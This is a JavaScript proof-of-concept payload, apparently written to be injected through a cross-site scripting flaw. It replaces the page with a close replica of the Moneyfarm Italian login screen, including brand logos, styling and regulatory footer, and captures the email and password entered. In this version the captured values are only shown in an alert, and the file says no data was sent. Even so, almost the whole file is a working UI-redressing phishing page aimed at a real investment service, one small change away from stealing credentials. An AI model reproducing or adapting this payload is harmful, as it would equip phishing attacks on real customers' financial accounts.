// Contents of moneyfarm-poc.js (hosted on http://localhost:8088/moneyfarm-poc.js)
(function () {
  // IIFE to keep scope clean

  function createFakeMoneyfarmPage() {
    // 1. Clear the existing page content
    document.documentElement.innerHTML = ""; // Clears everything

    // 2. Define the HTML and CSS for the fake login page
    const fakePageContent = `
        <head>
            <title>Accedi | Moneyfarm - PoC XSS</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
            <style>
                /* Basic Reset & Font */
                body, html { margin: 0; padding: 0; font-family: "Inter", Helvetica, Arial, sans-serif; background-color: #f8f9fa; color: #212529; line-height: 1.5; }
                * { box-sizing: border-box; }
                /* ... (ALL THE STYLES FROM THE PREVIOUS FULL PAYLOAD) ... */
                .poc-header { background-color: #fff; padding: 15px 30px; border-bottom: 1px solid #dee2e6; display: flex; justify-content: space-between; align-items: center; }
                .poc-logo-container a { display: flex; align-items: center; text-decoration: none; }
                .poc-logo-icon { margin-right: 8px; }
                .poc-lang-switcher { display: flex; align-items: center; cursor: pointer; padding: 5px 8px; border-radius: 4px; }
                .poc-lang-switcher:hover { background-color: #f1f1f1; }
                .poc-lang-switcher svg { margin-right: 5px; }
                .poc-main-section { display: flex; justify-content: center; align-items: flex-start; padding: 40px 20px; flex-grow: 1; min-height: calc(100vh - 150px); }
                .poc-login-box { background-color: #fff; padding: 30px 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 420px; }
                .poc-login-box h2 { font-size: 24px; color: #320327; margin-top: 0; margin-bottom: 8px; font-weight: 600; text-align: center; }
                .poc-login-box .poc-subtitle { font-size: 14px; color: #52575C; margin-bottom: 24px; text-align: center; }
                .poc-login-box .poc-subtitle a { color: #5B3552; text-decoration: none; font-weight: 600; }
                .poc-input-group { margin-bottom: 16px; text-align: left; }
                .poc-input-group label { display: block; font-size: 14px; font-weight: 600; color: #212529; margin-bottom: 8px; }
                .poc-input-wrapper { position: relative; }
                .poc-input-group input[type="email"], .poc-input-group input[type="password"] { width: 100%; padding: 12px 10px; border: 1px solid #CED4DA; border-radius: 4px; font-size: 16px; line-height: 1.5; }
                .poc-input-group input:focus { outline: none; border-color: #5B3552; box-shadow: 0 0 0 0.2rem rgba(91, 53, 82, 0.25); }
                .poc-show-password-btn { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #5B3552; cursor: pointer; font-size: 12px; font-weight: 600; padding: 5px; display: flex; align-items: center; }
                .poc-show-password-btn svg { margin-right: 4px; }
                .poc-submit-button-container { margin-bottom: 16px; }
                .poc-submit-btn { background-color: #E11F5E; color: white; padding: 12px 20px; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; transition: background-color 0.2s; }
                .poc-submit-btn:hover { background-color: #C81A52; }
                .poc-forgot-password-link { display: block; text-align: center; font-size: 14px; color: #5B3552; text-decoration: none; font-weight: 600; margin-bottom: 24px; }
                .poc-privacy-notice { font-size: 12px; color: #52575C; display: flex; align-items: center; }
                .poc-privacy-notice svg { margin-right: 8px; color: #5B3552; }
                .poc-privacy-notice a { color: #5B3552; text-decoration: none; font-weight: 600; }
                .poc-footer { background-color: #fff; padding: 20px 30px; border-top: 1px solid #e0e0e0; font-size: 12px; color: #52575C; text-align: center; }
                .poc-footer ul { list-style: none; padding: 0; margin: 0; display: inline-block; }
                .poc-footer li { margin-right: 15px; margin-bottom: 5px; display: inline-block; }
                .poc-footer a { color: #5B3552; text-decoration: none; }
            </style>
        </head>
        <body>
            <header class="poc-header">
                <div class="poc-logo-container">
                    <a href="#">
                        <div class="poc-logo-icon">
                            <svg width="36" height="30" viewBox="0 0 36 30" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M0 27.4412L5.07377 22.6147C7.68328 27.0349 12.4954 30 18 30C26.2843 30 33 23.2843 33 15C33 12.8314 32.5398 10.7704 31.7118 8.90909L36 4.83088V2.50838L30.9002 7.3414C28.2848 2.9455 23.4864 0 18 0C9.71573 0 3 6.71573 3 15C3 17.1485 3.4517 19.1915 4.26531 21.0392L0 25.1106V27.4412ZM28.9507 15C28.9507 21.0479 24.0479 25.9507 18 25.9507C13.6424 25.9507 9.87931 23.4055 8.1162 19.7206L14.1356 13.9946C14.3109 14.0472 14.4968 14.0755 14.6893 14.0755C15.0217 14.0755 15.3345 13.9911 15.6073 13.8426L19.6611 17.0964C19.653 17.1679 19.6489 17.2407 19.6489 17.3145C19.6489 18.3766 20.5099 19.2376 21.572 19.2376C22.6341 19.2376 23.4952 18.3766 23.4952 17.3145C23.4952 17.1333 23.4701 16.9579 23.4233 16.7917L28.519 11.9455C28.8001 12.915 28.9507 13.9399 28.9507 15ZM27.8575 10.2249L22.2687 15.5214C22.0527 15.4374 21.8177 15.3913 21.572 15.3913C21.2207 15.3913 20.8915 15.4855 20.6081 15.65L16.5929 12.4273C16.6058 12.3375 16.6124 12.2457 16.6124 12.1523C16.6124 11.0902 15.7514 10.2292 14.6893 10.2292C13.6272 10.2292 12.7661 11.0902 12.7661 12.1523C12.7661 12.3846 12.8073 12.6073 12.8828 12.8135L7.4619 17.9879C7.19313 17.0381 7.04931 16.0359 7.04931 15C7.04931 8.9521 11.9521 4.04931 18 4.04931C22.3361 4.04931 26.0835 6.56945 27.8575 10.2249Z" fill="#320327"></path></svg>
                        </div>
                        <div>
                            <svg width="156" height="24" viewBox="0 0 156 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M101.019 6.88579H95.9073V5.62134H95.9172C95.9172 4.61575 96.728 3.80132 97.7292 3.80132C98.0007 3.80132 98.2565 3.86604 98.4874 3.97357L100.029 0.500803C99.326 0.182201 98.5489 0 97.7292 0C94.6386 0 92.1328 2.51696 92.1328 5.62134H92.1378V6.88579H92.1328L92.1378 9.98718V19.4974H95.9073V9.98718H99.4122L101.019 6.88579Z" fill="#320327"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M108.749 16.3199C106.488 16.3199 104.655 14.479 104.655 12.208C104.655 9.93693 106.488 8.09601 108.749 8.09601C111.01 8.09601 112.843 9.93693 112.843 12.208C112.843 14.479 111.01 16.3199 108.749 16.3199ZM112.843 5.79809C111.661 5.03544 110.258 4.5874 108.749 4.5874C104.559 4.5874 101.162 7.99943 101.162 12.208C101.162 16.4165 104.559 19.8285 108.749 19.8285C110.258 19.8285 111.661 19.3805 112.843 18.6169V19.4532H116.613V4.96276H112.843V5.79809Z" fill="#320327"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M17.8943 4.51367C15.7651 4.51367 13.9136 5.70246 12.959 7.45477C12.958 7.45576 12.9571 7.45776 12.9561 7.45875C12.0025 5.70445 10.1509 4.51367 8.01985 4.51367C6.31795 4.51367 4.8014 5.2813 3.76956 6.48204V6.47308V4.88902H0V19.3795H3.76956V13.8517V11.1018V10.1121C3.76956 10.1131 3.77055 10.1151 3.77055 10.1161H3.77253V10.1629V10.9982C3.82804 9.35244 5.16914 8.03522 6.8205 8.03522C8.50753 8.03522 9.8744 9.4082 9.8744 11.1018V11.1028V15.4905V19.3795H9.87638H13.644H13.6469V13.8577V11.2063V10.9982C13.7014 9.35244 15.0435 8.03522 16.6949 8.03522C18.3809 8.03522 19.7478 9.4082 19.7478 11.1018V11.1028V15.4905V19.3795H23.5184V10.1629C23.5184 10.147 23.5154 10.132 23.5154 10.1161C23.4906 7.01769 20.9848 4.51367 17.8943 4.51367Z" fill="#320327"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M155.445 10.1161C155.42 7.01769 152.914 4.51367 149.824 4.51367C147.695 4.51367 145.843 5.70246 144.888 7.45477C144.887 7.45576 144.887 7.45776 144.886 7.45875C143.932 5.70445 142.08 4.51367 139.95 4.51367C138.247 4.51367 136.73 5.2813 135.699 6.48204V6.47308V4.88902H131.93V19.3795H135.699V13.8517V11.1018V10.1121V10.1161L135.702 10.1151V10.1629V10.9972C135.757 9.35244 137.099 8.03522 138.75 8.03522C140.436 8.03522 141.803 9.4082 141.803 11.1018V11.1028V15.4905V19.3795H141.806H145.574H145.576V13.8577V11.2063V10.9972C145.631 9.35244 146.973 8.03522 148.625 8.03522C150.311 8.03522 151.678 9.4082 151.678 11.1018V11.1028V15.4905V19.3795H155.447V10.1629C155.447 10.147 155.445 10.132 155.445 10.1161Z" fill="#320327"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M56.4338 9.89998C56.4278 9.76458 56.4209 9.63017 56.406 9.49775C56.3931 9.39321 56.3743 9.29165 56.3565 9.1891C56.3386 9.08456 56.3188 8.98002 56.295 8.87747C56.2712 8.77193 56.2435 8.66839 56.2127 8.56484C56.185 8.46926 56.1533 8.37468 56.1206 8.28109C56.0839 8.17953 56.0492 8.07798 56.0076 7.97841C55.9679 7.88283 55.9213 7.79124 55.8767 7.69864C55.8381 7.618 55.8054 7.53436 55.7637 7.4567C55.7627 7.45869 55.7617 7.45969 55.7617 7.46168C54.8072 5.70738 52.9556 4.5166 50.8245 4.5166C49.1226 4.5166 47.6061 5.28423 46.5752 6.48497V6.47601V4.89196H42.8047V19.3814H46.5752V13.8546V11.1047V10.114V10.119L46.5772 10.118V10.1648V11.0002C46.6327 9.35537 47.9738 8.03815 49.6252 8.03815C51.3122 8.03815 52.6791 9.41113 52.6791 11.1047V11.1057V15.4934V19.3814H52.6811H56.4486H56.4516V13.8596V11.2092V11.0002V10.1648V10.118L56.4486 10.119C56.4486 10.0444 56.4368 9.97366 56.4338 9.89998Z" fill="#320327"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M33.2429 16.2462C30.982 16.2462 29.1493 14.4053 29.1493 12.1342C29.1493 9.8632 30.982 8.02228 33.2429 8.02228C35.5039 8.02228 37.3366 9.8632 37.3366 12.1342C37.3366 14.4053 35.5039 16.2462 33.2429 16.2462ZM33.2429 4.51367C29.0531 4.51367 25.6562 7.9257 25.6562 12.1342C25.6562 16.3428 29.0531 19.7548 33.2429 19.7548C37.4328 19.7548 40.8296 16.3428 40.8296 12.1342C40.8296 7.9257 37.4328 4.51367 33.2429 4.51367Z" fill="#320327"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M62.2958 10.8648C62.8291 9.21604 64.3694 8.02228 66.1883 8.02228C68.0081 8.02228 69.5484 9.21604 70.0817 10.8648H62.2958ZM66.1883 4.51367C61.9984 4.51367 58.6016 7.9257 58.6016 12.1342C58.6016 16.3428 61.9984 19.7548 66.1883 19.7548C69.3076 19.7548 71.9838 17.8631 73.1495 15.162L69.5425 14.4879C68.8021 15.5503 67.5769 16.2462 66.1883 16.2462C64.3694 16.2462 62.8291 15.0534 62.2958 13.4037H70.0817H73.662C73.7304 12.9905 73.775 12.5683 73.775 12.1342C73.775 11.7011 73.7304 11.279 73.662 10.8648C73.0583 7.26162 69.9469 4.51367 66.1883 4.51367Z" fill="#320327"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M82.3047 14.2919L78.1337 4.89111H74.1055L80.2906 18.831L77.997 24.0003H82.0252L82.3047 23.37L84.3189 18.831L90.504 4.89111H86.4757L82.3047 14.2919Z" fill="#320327"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M127.286 4.91655C125.737 4.91655 124.21 5.8614 123.545 7.2065V4.88867H122.568H119.775V19.3791H123.545V12.2544C123.648 10.2661 125.281 8.68402 127.286 8.68402H129.721V4.91655H127.286Z" fill="#320327"></path></svg>
                        </div>
                    </a>
                </div>
                <div class="poc-lang-switcher">
                    <svg role="img" width="21px" height="21px" xmlns="http://www.w3.org/2000/svg"><use xlink:href="#icon-flag-it"></use></svg>
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" color="currentColor" role="img"><path d="M18 9.00005C18 9.00005 13.5811 15 12 15C10.4188 15 6 9 6 9" stroke="currentColor"></path></svg>
                </div>
            </header>

            <section class="poc-main-section">
                <div class="poc-login-box">
                    <h2>Accedi a Moneyfarm</h2>
                    <p class="poc-subtitle">Sei un nuovo utente? <a href="#">Crea un account</a></p>
                    <form id="pocPhishingForm">
                        <div class="poc-input-group">
                            <label for="poc-email">Email</label>
                            <input type="email" id="poc-email" name="email" autocomplete="email" value="" required>
                        </div>
                        <div class="poc-input-group">
                            <label for="poc-password">Password</label>
                            <div class="poc-input-wrapper">
                                <input type="password" id="poc-password" name="password" autocomplete="current-password" value="" required>
                                <button type="button" class="poc-show-password-btn" id="poc-toggle-password">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21.544 11.045C21.848 11.4713 22 11.6845 22 12C22 12.3155 21.848 12.5287 21.544 12.955C20.1779 14.8706 16.6892 19 12 19C7.31078 19 3.8221 14.8706 2.45604 12.955C2.15201 12.5287 2 12.3155 2 12C2 11.6845 2.15201 11.4713 2.45604 11.045C3.8221 9.12944 7.31078 5 12 5C16.6892 5 20.1779 9.12944 21.544 11.045Z"></path><path d="M15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15C13.6569 15 15 13.6569 15 12Z"></path></svg>
                                    Mostra
                                </button>
                            </div>
                        </div>
                        <div class="poc-submit-button-container">
                            <button type="submit" class="poc-submit-btn">Accedi</button>
                        </div>
                    </form>
                    <div class="poc-links">
                        <a href="#" class="poc-forgot-password-link">Problemi ad accedere?</a>
                    </div>
                     <div class="poc-privacy-notice">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 16.5V14.5"></path><path d="M4.26781 18.8447C4.49269 20.515 5.87613 21.8235 7.55966 21.9009C8.97627 21.966 10.4153 22 12 22C13.5847 22 15.0237 21.966 16.4403 21.9009C18.1239 21.8235 19.5073 20.515 19.7322 18.8447C19.879 17.7547 20 16.6376 20 15.5C20 14.3624 19.879 13.2453 19.7322 12.1553C19.5073 10.485 18.1239 9.17649 16.4403 9.09909C15.0237 9.03397 13.5847 9 12 9C10.4153 9 8.97627 9.03397 7.55966 9.09909C5.87613 9.17649 4.49269 10.485 4.26781 12.1553C4.12104 13.2453 4 14.3624 4 15.5C4 16.6376 4.12104 17.7547 4.26781 18.8447Z"></path><path d="M7.5 9V6.5C7.5 4.01472 9.51472 2 12 2C14.4853 2 16.5 4.01472 16.5 6.5V9"></path></svg>
                        <span>Moneyfarm è sicura e autorizzata dalla FCA. Continuando accetti la nostra <a href="#">Privacy Policy</a></span>
                    </div>
                </div>
            </section>

            <footer class="poc-footer">
                <ul>
                    <li>Domande? <a href="#">Domande frequenti</a> oppure contattaci.</li>
                    <li><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" color="#5B3552"><path d="M9.1585 5.71223L8.75584 4.80625C8.49256 4.21388 8.36092 3.91768 8.16405 3.69101C7.91732 3.40694 7.59571 3.19794 7.23592 3.08785C6.94883 3 6.6247 3 5.97645 3C5.02815 3 4.554 3 4.15597 3.18229C3.68711 3.39702 3.26368 3.86328 3.09497 4.3506C2.95175 4.76429 2.99278 5.18943 3.07482 6.0397C3.94815 15.0902 8.91006 20.0521 17.9605 20.9254C18.8108 21.0075 19.236 21.0485 19.6496 20.9053C20.137 20.7366 20.6032 20.3131 20.818 19.8443C21.0002 19.4462 21.0002 18.9721 21.0002 18.0238C21.0002 17.3755 21.0002 17.0514 20.9124 16.7643C20.8023 16.4045 20.5933 16.0829 20.3092 15.8362C20.0826 15.6393 19.7864 15.5077 19.194 15.2444L18.288 14.8417C17.6465 14.5566 17.3257 14.4141 16.9998 14.3831C16.6878 14.3534 16.3733 14.3972 16.0813 14.5109C15.7762 14.6297 15.5066 14.8544 14.9672 15.3038C14.4304 15.7512 14.162 15.9749 13.834 16.0947C13.5432 16.2009 13.1588 16.2403 12.8526 16.1951C12.5071 16.1442 12.2426 16.0029 11.7135 15.7201C10.0675 14.8405 9.15977 13.9328 8.28011 12.2867C7.99738 11.7577 7.85602 11.4931 7.80511 11.1477C7.75998 10.8414 7.79932 10.457 7.90554 10.1663C8.02536 9.83828 8.24905 9.56986 8.69643 9.033C9.14586 8.49368 9.37058 8.22402 9.48939 7.91891C9.60309 7.62694 9.64686 7.3124 9.61719 7.00048C9.58618 6.67452 9.44362 6.35376 9.1585 5.71223Z" stroke="currentColor"></path></svg><a href="#">+390245076621</a></li>
                    <li><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" color="#5B3552"><path d="M2 6L8.91302 9.91697C11.4616 11.361 12.5384 11.361 15.087 9.91697L22 6"></path><path d="M2.01577 13.4756C2.08114 16.5412 2.11383 18.0739 3.24496 19.2094C4.37608 20.3448 5.95033 20.3843 9.09883 20.4634C11.0393 20.5122 12.9607 20.5122 14.9012 20.4634C18.0497 20.3843 19.6239 20.3448 20.7551 19.2094C21.8862 18.0739 21.9189 16.5412 21.9842 13.4756C22.0053 12.4899 22.0053 11.5101 21.9842 10.5244C21.9189 7.45886 21.8862 5.92609 20.7551 4.79066C19.6239 3.65523 18.0497 3.61568 14.9012 3.53657C12.9607 3.48781 11.0393 3.48781 9.09882 3.53656C5.95033 3.61566 4.37608 3.65521 3.24495 4.79065C2.11382 5.92608 2.08114 7.45885 2.01576 10.5244C1.99474 11.5101 1.99475 12.4899 2.01577 13.4756Z" stroke="currentColor"></path></svg><a href="#">info@moneyfarm.com</a></li>
                </ul>
                <p style="margin-top: 10px;">©2025 MFM Investment Ltd. Autorizzato e regolamentato dalla FCA. Avvertenza: ogni investimento è soggetto al rischio di mercato.</p>
            </footer>
             <svg style="position:absolute;width:0;height:0;overflow:hidden" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                <defs>
                    <symbol id="icon-flag-it" viewBox="0 0 21 15">
                        <rect fill="#FFF" x="0" y="0" width="21" height="15"></rect>
                        <rect fill="#E43D4C" x="10" y="0" width="11" height="15"></rect>
                        <rect fill="#1BB65D" x="0" y="0" width="7" height="15"></rect>
                        <rect fill="#FFF" x="7" y="0" width="7" height="15"></rect>
                    </symbol>
                </defs>
            </svg>
        </body>
        `;
    document.documentElement.innerHTML = fakePageContent;

    setTimeout(function () {
      var form = document.getElementById("pocPhishingForm");
      var passwordField = document.getElementById("poc-password");
      var togglePasswordBtn = document.getElementById("poc-toggle-password");

      if (form) {
        form.addEventListener("submit", function (event) {
          event.preventDefault();
          var email = document.getElementById("poc-email").value;
          var pass = passwordField.value;
          alert(
            "--- PoC: XSS UI Redressing ---\n\n" +
              "Email: " +
              email +
              "\n" +
              "Password: " +
              pass +
              "\n\n" +
              "just a poc. Nessun dato è stato inviato.",
          );
        });
      }
      if (togglePasswordBtn && passwordField) {
        togglePasswordBtn.addEventListener("click", function () {
          const type =
            passwordField.getAttribute("type") === "password"
              ? "text"
              : "password";
          passwordField.setAttribute("type", type);
          const svgIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21.544 11.045C21.848 11.4713 22 11.6845 22 12C22 12.3155 21.848 12.5287 21.544 12.955C20.1779 14.8706 16.6892 19 12 19C7.31078 19 3.8221 14.8706 2.45604 12.955C2.15201 12.5287 2 12.3155 2 12C2 11.6845 2.15201 11.4713 2.45604 11.045C3.8221 9.12944 7.31078 5 12 5C16.6892 5 20.1779 9.12944 21.544 11.045Z"></path><path d="M15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15C13.6569 15 15 13.6569 15 12Z"></path></svg>`;
          this.innerHTML = `${svgIcon} ${type === "password" ? "Mostra" : "Nascondi"}`;
        });
      }
    }, 200);
  }
  createFakeMoneyfarmPage();
})();
